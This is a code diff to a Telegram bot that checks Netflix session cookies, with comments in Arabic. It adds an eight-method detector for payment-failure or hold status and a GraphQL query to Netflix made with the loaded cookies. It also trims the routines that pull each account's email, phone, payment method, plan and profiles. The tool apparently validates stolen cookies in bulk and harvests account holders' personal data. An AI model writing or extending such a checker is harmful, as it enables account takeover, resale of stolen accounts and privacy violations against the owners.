@@ -1,4 +1,4 @@
-# NF.py - Netflix Cookies Checker Bot (Stable Version - No GraphQL)
+# NF.py - Netflix Cookies Checker Bot (8-Layer Payment Detection)
 import os
 import re
 import json
@@ -6,6 +6,7 @@ import zipfile
 import html
 import time
 import asyncio
+import urllib.parse
 from datetime import datetime
 from io import BytesIO
 
@@ -353,6 +354,125 @@ def format_membership_status(status):
     else:
         return status.title()
 
+# ======================== 🎯 كشف payment failed - 8 طرق ========================
+def detect_payment_failed(html_content, graphql_response=""):
+    """
+    بيفحص payment failed بـ 8 طرق مختلفة
+    لو أي طريقة رجعت True → الحساب Hold
+    """
+    
+    if not html_content and not graphql_response:
+        return False, "No content"
+    
+    html_lower = (html_content or "").lower()
+    gql_lower = (graphql_response or "").lower()
+    
+    # ============ الطريقة 1: holdStatus: true ============
+    if '"holdstatus":true' in html_lower or '"holdstatus": true' in html_lower:
+        return True, "holdStatus=true"
+    
+    # ============ الطريقة 2: membershipStatus OnHold/PastDue ============
+    if '"membershipstatus":"onhold"' in html_lower or '"membershipstatus": "onhold"' in html_lower:
+        return True, "membershipStatus=OnHold"
+    if '"membershipstatus":"pastdue"' in html_lower or '"membershipstatus": "pastdue"' in html_lower:
+        return True, "membershipStatus=PastDue"
+    
+    # ============ الطريقة 3: نص صريح في HTML ============
+    html_text_signs = [
+        "update your payment information to continue",
+        "we were unable to process your last payment",
+        "please update your payment information",
+        "your payment was declined",
+        "there was a problem with your payment",
+        "problem with your last payment",
+        "unable to process your last payment",
+    ]
+    for sign in html_text_signs:
+        if sign in html_lower:
+            return True, f"HTML text: {sign[:30]}"
+    
+    # ============ الطريقة 4: testId UPDATE_PAYMENT_METHOD ============
+    if 'update_payment_method' in html_lower:
+        return True, "testId=UPDATE_PAYMENT_METHOD"
+    
+    # ============ الطريقة 5: clcsPaymentFailureBannerView في GraphQL ============
+    if 'clcspaymentfailurebannerview' in gql_lower:
+        return True, "GraphQL: clcsPaymentFailureBannerView"
+    
+    # ============ الطريقة 6: payment_failure_interstitial ============
+    if 'payment_failure_interstitial' in gql_lower or 'payment_failure_interstitial' in html_lower:
+        return True, "payment_failure_interstitial"
+    
+    # ============ الطريقة 7: GraphQL نص صريح ============
+    gql_text_signs = [
+        '"value":"update your payment information to continue."',
+        '"value":"we were unable to process your last payment',
+    ]
+    for sign in gql_text_signs:
+        if sign in gql_lower:
+            return True, f"GraphQL text: {sign[:30]}"
+    
+    # ============ الطريقة 8: aria-label أو data-uia بخصوص payment ============
+    payment_ui_signs = [
+        'data-uia="payment-',
+        'data-uia="update-payment',
+        'aria-label="update payment',
+        'class="payment-failure',
+        'class="payment-failed',
+    ]
+    for sign in payment_ui_signs:
+        if sign in html_lower:
+            return True, f"UI: {sign[:30]}"
+    
+    return False, "No payment failure detected"
+
+# ======================== GraphQL check ========================
+GRAPHQL_PERSISTED_QUERY_IDS = [
+    "03b4bbd1-8fa5-4528-bcee-7d539f207dde",
+    "a94e4f9f-e396-4a9d-8429-b2e5bdb08748",
+]
+
+async def fetch_graphql_response(session):
+    """بيجرب يجيب GraphQL response من أي ID متاح"""
+    
+    headers = {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": "https://www.netflix.com",
+        "referer": "https://www.netflix.com/account",
+        "x-netflix.context.operation-name": "CLCSInterstitialAccountPages",
+        "x-netflix.request.originating.url": "https://www.netflix.com/account",
+    }
+    
+    for pq_id in GRAPHQL_PERSISTED_QUERY_IDS:
+        try:
+            body = {
+                "operationName": "CLCSInterstitialAccountPages",
+                "variables": {
+                    "format": "HTML",
+                    "resolutionMode": "WEB_1X",
+                    "accountSubpage": "/account"
+                },
+                "extensions": {
+                    "persistedQuery": {
+                        "id": pq_id,
+                        "version": 102
+                    }
+                }
+            }
+            
+            async with session.post("https://www.netflix.com/graphql", json=body, headers=headers) as resp:
+                if resp.status == 200:
+                    response_text = await resp.text()
+                    # لو رجع response فيه data حقيقية
+                    if '"data"' in response_text and len(response_text) > 200:
+                        return response_text
+        except:
+            continue
+    
+    return ""
+
 # ======================== دوال استخراج الكوكيز ========================
 def extract_all_cookies_from_file(content):
     accounts = []
@@ -687,32 +807,11 @@ async def extract_profiles_from_manage(session):
                         profiles.append(pname)
 
             if not profiles:
-                alt_pattern2 = r'"profileGuid"\s*:\s*"[^"]+"\s*,\s*"name"\s*:\s*"([^"]+)"'
-                matches = re.finditer(alt_pattern2, html_content)
-                for match in matches:
-                    pname = clean_profile_name(match.group(1))
-                    if is_valid_profile_name(pname) and pname not in profiles:
-                        profiles.append(pname)
-
-            if not profiles:
                 next_data_match = re.search(r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.{0,500000}?)</script>', html_content, re.DOTALL)
                 if next_data_match:
                     try:
                         next_data = json.loads(next_data_match.group(1))
                         names = _find_profile_names_in_json(next_data)
-                        for n in names:
-                            pname = clean_profile_name(n)
-                            if is_valid_profile_name(pname) and pname not in profiles:
-                                profiles.append(pname)
-                    except:
-                        pass
-
-            if not profiles:
-                react_match = re.search(r'netflix\.react\.context\s*=\s*(\{.{0,500000}?\});', html_content, re.DOTALL)
-                if react_match:
-                    try:
-                        ctx = json.loads(react_match.group(1))
-                        names = _find_profile_names_in_json(ctx)
                         for n in names:
                             pname = clean_profile_name(n)
                             if is_valid_profile_name(pname) and pname not in profiles:
@@ -788,10 +887,6 @@ async def get_account_info(cookies):
                         email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html_content)
                         if email_match:
                             email = decode_value(email_match.group(1))
-                    if not email:
-                        email_match = re.search(r'<span[^>]*class="[^"]*email[^"]*"[^>]*>([^<]+)</span>', html_content, re.IGNORECASE)
-                        if email_match:
-                            email = decode_value(email_match.group(1))
                     info["email"] = email
 
                     country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', html_content)
@@ -819,10 +914,6 @@ async def get_account_info(cookies):
                     payment_method = extract_payment_method(html_content)
                     if payment_method:
                         info["payment"] = payment_method
-                    else:
-                        payment_match = re.search(r'"paymentMethod"\s*:\s*"([^"]+)"', html_content)
-                        if payment_match:
-                            info["payment"] = decode_value(payment_match.group(1))
 
                     phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html_content)
                     if phone_match:
@@ -852,10 +943,6 @@ async def get_account_info(cookies):
                     else:
                         info["status"] = "Active"
 
-                    # لو holdStatus = true → Hold
-                    if info.get("hold") == "Yes":
-                        info["status"] = "Hold"
-
                     plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', html_content)
                     if not plan_match:
                         plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html_content)
@@ -866,20 +953,32 @@ async def get_account_info(cookies):
                     if quality_match:
                         info["quality"] = decode_value(quality_match.group(1))
 
-                    profiles = await extract_profiles_from_manage(session)
+            # ✅ GraphQL check (اختياري - لو فشل، مفيش مشكلة)
+            graphql_response = ""
+            try:
+                graphql_response = await fetch_graphql_response(session)
+            except:
+                pass
 
-                    if profiles:
-                        info["profiles"] = profiles
-                        info["profiles_count"] = len(profiles)
-                        info["profiles_list"] = ", ".join(profiles)
-                    else:
-                        info["profiles"] = []
-                        info["profiles_count"] = 0
-                        info["profiles_list"] = "No profiles found"
+            # ✅ كشف payment failed بـ 8 طرق
+            payment_failed, reason = detect_payment_failed(html_content, graphql_response)
+            
+            if payment_failed:
+                info["status"] = "Hold"
+                print(f"[Hold Detected] {reason}")
 
-                    return info, None
+            profiles = await extract_profiles_from_manage(session)
 
-                return None, f"HTTP {resp.status}"
+            if profiles:
+                info["profiles"] = profiles
+                info["profiles_count"] = len(profiles)
+                info["profiles_list"] = ", ".join(profiles)
+            else:
+                info["profiles"] = []
+                info["profiles_count"] = 0
+                info["profiles_list"] = "No profiles found"
+
+            return info, None
 
     except asyncio.TimeoutError:
         return None, "Request timed out"
@@ -1644,10 +1743,10 @@ def main():
 
     print("=" * 50)
     print("✅ Netflix Checker Bot is running...")
-    print("✅ Stable version - No GraphQL")
+    print("✅ 8-Layer Payment Detection")
+    print("✅ GraphQL + HTML checks (fallback safe)")
     print("✅ Async mode - /cancel INSTANT")
     print("✅ Profile extraction (15 methods)")
-    print("✅ Language & UI filter active")
     print("=" * 50)
 
     app.run_polling(allowed_updates=Update.ALL_TYPES)
